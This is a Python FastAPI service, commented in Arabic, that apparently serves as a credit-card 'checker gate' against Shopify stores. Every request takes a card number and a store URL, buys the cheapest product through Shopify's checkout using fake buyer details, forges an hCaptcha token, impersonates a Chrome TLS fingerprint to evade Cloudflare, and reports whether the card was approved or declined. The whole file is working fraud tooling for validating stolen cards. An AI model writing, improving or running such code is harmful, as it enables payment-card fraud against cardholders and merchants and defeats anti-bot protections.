from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi import requests
import re
import uuid
import random
import string
import time
import urllib3
from html import unescape
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    proxy_str = proxy_str.replace('http://', '').replace('https://', '')
    parts = proxy_str.split(':')
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return f"http://{proxy_str}"

def safe_response(msg, raw_data, price, gate="Shopify Payments"):
    raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:400] if raw_data else "No Raw Data"
    final_msg = f"{msg} | RAW: {raw_clean}" if ("Failed" in msg or "Error" in msg or "Unrecognized" in msg) else msg
    clean_price = str(price).replace('$', '').strip() if price else "-"
    return {"Response": final_msg, "Price": clean_price, "Gate": gate}

def generate_short_token():
    # توليد الجزء العشوائي من الـ attemptToken بناءً على تحليلك
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))

def generate_page_id():
    # توليد PageID بنفس صيغة شوبي فاي
    return str(uuid.uuid4()).upper()

@app.get("/code/index.php")
def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    start_time = time.time()
    try:
        cc_parts = re.findall(r'\d+', cc.replace('|', ' '))
        if len(cc_parts) < 4: return JSONResponse(content=safe_response("Invalid CC Format", "", "-"))
        cc_num, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = url.rstrip('/')
        try: scope_host = urlparse(store_url).netloc or store_url.replace('https://', '').replace('http://', '').split('/')[0]
        except: scope_host = store_url.replace('https://', '').replace('http://', '').split('/')[0]
        
        proxy_url = format_proxy(proxy)
        proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

        fn = random.choice(["Michael", "James", "David", "John", "Robert"])
        ln = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
        full_name = f"{fn} {ln}"
        email = f"{fn.lower()}{ln.lower()}{random.randint(100, 999)}@gmail.com"
        address1 = f"{random.randint(100, 9999)} Broadway"
        phone = f"212{random.randint(2000000, 9999999)}"

        buyer = {
            "email": email, "first_name": fn, "last_name": ln, "full_name": full_name,
            "address1": address1, "city": "New York", "province": "NY", "zip": "10024", "country": "US", "phone": phone
        }

        # استخدام curl_cffi لتخطي الـ TLS وحماية Cloudflare بسرعة
        with requests.Session(impersonate="chrome120") as session:
            session.verify = False

            # 1. سحب المنتج
            variant_id, price = None, "-"
            r1 = session.get(f"{store_url}/products.json?limit=250", timeout=10, proxies=proxies)
            if r1.status_code == 200:
                data = r1.json()
                prods = data.get('products', []) if isinstance(data, dict) else (data if isinstance(data, list) else [])
                for p in prods:
                    for v in p.get('variants', []):
                        if v.get('available'):
                            pr = float(v.get('price', 0))
                            if pr > 10000: pr /= 100.0
                            if pr > 0:
                                variant_id = str(v.get('id'))
                                price = "{:.2f}".format(pr)
                                break
                    if variant_id: break

            if not variant_id: return JSONResponse(content=safe_response("Product Not Found", "", "-"))

            # 2. الإضافة للسلة وتوليد التوكن
            session.post(f"{store_url}/cart/add.js", json={"id": variant_id, "quantity": 1}, proxies=proxies)
            res_chk = session.post(f"{store_url}/cart", data={"checkout": "Checkout"}, allow_redirects=True, proxies=proxies)
            html_chk = res_chk.text
            final_url = str(res_chk.url)

            session_token, checkout_token = None, None
            ct_match = re.search(r'/checkouts/(?:c|cn|unstable|c/graphql)/([^/?]+)', final_url)
            if ct_match: checkout_token = ct_match.group(1)

            meta_st = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html_chk)
            js_st = re.search(r'["\']?sessionToken["\']?\s*:\s*["\']([^"\']{20,})["\']', html_chk, re.IGNORECASE)
            jwt_match = re.search(r'(eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,})', html_chk)

            if meta_st: session_token = unescape(meta_st.group(1))
            elif js_st: session_token = unescape(js_st.group(1))
            elif jwt_match: session_token = jwt_match.group(1)

            if not session_token or not checkout_token: 
                return JSONResponse(content=safe_response("Session Token Missing", "Cloudflare Block or Custom Checkout", price))

            # 3. تشفير الفيزا (PCI)
            pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json"}
            res_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc_num, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['full_name']}, "payment_session_scope": scope_host}, headers=pci_headers, proxies=proxies)
            if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:80], price))
            card_session_id = res_pci.json().get("id")

            # 4. تجهيز الـ Proposal
            gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
            gql_headers = {
                'shopify-checkout-client': 'checkout-web/1.0', 
                'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
                'x-checkout-web-source-id': checkout_token, 
                'x-checkout-one-session-token': session_token, 
                'Content-Type': 'application/json',
                'Origin': store_url, 'Referer': final_url
            }
            
            flat_address = {
                "address1": buyer["address1"], "address2": "", "city": buyer["city"], "countryCode": buyer["country"],
                "postalCode": buyer["zip"], "firstName": buyer["first_name"], "lastName": buyer["last_name"],
                "zoneCode": buyer["province"], "phone": buyer["phone"]
            }
            merch_id = str(uuid.uuid4())

            prop_query = """query Proposal($delivery: DeliveryTermsInput, $payment: PaymentTermInput, $merchandise: MerchandiseTermInput, $buyerIdentity: BuyerIdentityTermInput, $sessionInput: SessionTokenInput!) { session(sessionInput: $sessionInput) { negotiate(input: {purchaseProposal: {delivery: $delivery, payment: $payment, merchandise: $merchandise, buyerIdentity: $buyerIdentity}}) { result { ... on NegotiationResultAvailable { queueToken sellerProposal { payment { ... on FilledPaymentTerms { availablePaymentLines { paymentMethod { ... on PaymentProvider { paymentMethodIdentifier name } } } } } delivery { ... on FilledDeliveryTerms { deliveryLines { selectedDeliveryStrategy { ... on CompleteDeliveryStrategy { handle amount { ... on MoneyValueConstraint { value { amount currencyCode } } } } } availableDeliveryStrategies { ... on CompleteDeliveryStrategy { handle amount { ... on MoneyValueConstraint { value { amount currencyCode } } } } } } } } } } } } } }"""
            
            prop_vars = {
                "sessionInput": {"sessionToken": session_token},
                "delivery": {"deliveryLines": [{"destination": {"partialStreetAddress": flat_address}, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {}}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "expectedTotalPrice": {"any": True}, "destinationChanged": False}], "noDeliveryRequired": [], "useProgressiveRates": False, "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True},
                "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": flat_address}},
                "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": []}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}, "lineComponentsSource": None, "lineComponents": []}]},
                "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "emailChanged": False, "phoneCountryCode": "US", "marketingConsent": [], "shopPayOptInPhone": {"number": buyer["phone"], "countryCode": "US"}, "rememberMe": False}
            }
            
            res_prop = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers, proxies=proxies)
            queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')

            # استخراج بوابة الدفع وطريقة الشحن
            gateway_id = "cad649605672ab70f23f8c528db5e8ae" # افتراضي من البايلود بتاعك
            delivery_handle = "any"
            del_amt_constraint = {"any": True}
            try:
                seller_prop = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
                avail_payments = seller_prop.get('payment', {}).get('availablePaymentLines', [])
                for p in avail_payments:
                    pm = p.get('paymentMethod', {})
                    if pm.get('paymentMethodIdentifier'):
                        gateway_id = pm.get('paymentMethodIdentifier')
                        if pm.get('name') == 'shopify_payments': break
                        
                d_lines = seller_prop.get('delivery', {}).get('deliveryLines', [])
                if d_lines and d_lines[0].get('selectedDeliveryStrategy'):
                    delivery_handle = d_lines[0]['selectedDeliveryStrategy'].get('handle', 'any')
                    d_amt = d_lines[0]['selectedDeliveryStrategy'].get('amount', {}).get('value')
                    if d_amt: del_amt_constraint = {"value": {"amount": d_amt['amount'], "currencyCode": d_amt['currencyCode']}}
            except: pass

            # 5. تقديم الدفع النهائي (بصمات الهاكرز المدمجة)
            sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
            sub_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){__typename ...on SubmitSuccess{receipt{__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}...on SubmitAlreadyAccepted{receipt{__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id}...on FailedReceipt{id}}}...on SubmitRejected{__typename errors{code localizedMessage}}...on SubmittedForCompletion{receipt{__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id}...on FailedReceipt{id}}}}}"""
            
            sub_vars = {
                "attemptToken": f"{checkout_token}-{generate_short_token()}", # 🔥 تصحيح الـ attemptToken
                "input": {
                    "sessionInput": {"sessionToken": session_token}, 
                    "queueToken": queue_token, 
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {"deliveryLines": [{"destination": {"partialStreetAddress": flat_address}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": False, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": delivery_handle, "customDeliveryRate": False}, "options": {"phone": buyer["phone"]}}, "expectedTotalPrice": del_amt_constraint}], "noDeliveryRequired": [], "useProgressiveRates": False, "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True},
                    "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": []}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}, "lineComponentsSource": None, "lineComponents": []}]},
                    "taxes": {"proposedTotalAmount": {"any": True}},
                    "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": gateway_id, "sessionId": card_session_id, "billingAddress": {"streetAddress": flat_address}}}, "amount": {"any": True}}], "billingAddress": {"streetAddress": flat_address}},
                    "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "emailChanged": False, "phoneCountryCode": "US", "marketingConsent": [{"email": {"consentState": "DECLINED", "value": buyer["email"]}}], "shopPayOptInPhone": {"number": buyer["phone"], "countryCode": "US"}, "rememberMe": False},
                    
                    # 🔥 حقن البصمات الأمنية (Analytics & Mock Captcha)
                    "analytics": {
                        "requestUrl": final_url,
                        "pageId": generate_page_id()
                    },
                    "captcha": {
                        "provider": "hcaptcha",
                        "challenge": "comparison_challenge_type",
                        "token": f"P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.{generate_short_token()}_{generate_page_id()}" # توكن وهمي مُقنع
                    }
                }
            }
            
            res_sub = session.post(sub_url, json={"operationName": "SubmitForCompletion", "query": sub_query, "variables": sub_vars}, headers=gql_headers, proxies=proxies)
            sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
            sub_typename = sub_data.get('__typename') if sub_data else None
            
            if sub_typename == 'SubmitRejected':
                errs = sub_data.get('errors', [])
                msg = errs[0].get('localizedMessage', 'Rejected') if errs else 'Rejected'
                return JSONResponse(content=safe_response(f"Shopify Rejected: {msg}", res_sub.text[:100], price))
            
            if sub_typename == 'SubmitFailed':
                # لو رجع هنا، يبقى شوبي فاي قفش التوكن الوهمي ومفيش حل غير إضافة خدمة حل كابتشا مدفوعة
                return JSONResponse(content=safe_response("Declined: Silent Gateway Rejection 💳", "SubmitFailed Detected", price))

            receipt_id = sub_data.get('receipt', {}).get('id')
            if not receipt_id: 
                err = sub_data.get('receipt', {}).get('processingError', {}).get('code')
                if err: return JSONResponse(content=safe_response(f"Declined: {err} 💳", res_sub.text[:100], price))
                return JSONResponse(content=safe_response("Submit Failed (No Receipt)", res_sub.text[:100], price))

            # 6. فحص النتيجة النهائية من البنك
            poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
            poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}}}"""
            
            for _ in range(6):
                res_poll = session.post(poll_url, json={"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": session_token}}, headers=gql_headers, proxies=proxies)
                p_type = res_poll.json().get('data', {}).get('receipt', {}).get('__typename')
                if p_type == 'ProcessedReceipt': 
                    return JSONResponse(content=safe_response("Order completed 💎", "Success", price))
                elif p_type == 'FailedReceipt':
                    err = res_poll.json().get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'DECLINED')
                    return JSONResponse(content=safe_response(f"Declined: {err} 💳", err, price))
                time.sleep(1.5)
                
            return JSONResponse(content=safe_response("Bank Timeout", "Bank taking too long", price))

    except Exception as e:
        return JSONResponse(content=safe_response("System Error", str(e), "-"))
